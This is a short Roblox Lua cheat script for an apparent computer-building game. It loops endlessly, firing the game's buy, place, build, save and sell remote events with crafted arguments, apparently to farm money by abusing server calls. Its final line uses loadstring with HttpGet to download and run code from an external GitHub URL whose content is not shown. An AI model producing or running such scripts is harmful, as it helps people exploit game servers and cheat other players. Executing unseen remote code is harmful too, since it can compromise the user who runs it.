function execute()
 while wait() do
game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.BuyItem:FireServer("Honeycomb GL", false, "1")
game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.PlaceItem:FireServer("Honeycomb GL")
game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.BuildPc:FireServer("finish editing component")
game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.Save:FireServer("pp")
   for i = 1, 10 do
       game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.Sell:FireServer("error")
       game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.Sell:FireServer("error"..i)
   end
game:GetService("ReplicatedStorage").Resources.Remotes.RemoteEvents.Sell:FireServer("pp")
end
end

loadstring(game:HttpGet"https://raw.githubusercontent.com/MadGics/Scripty/main/R.Key")()
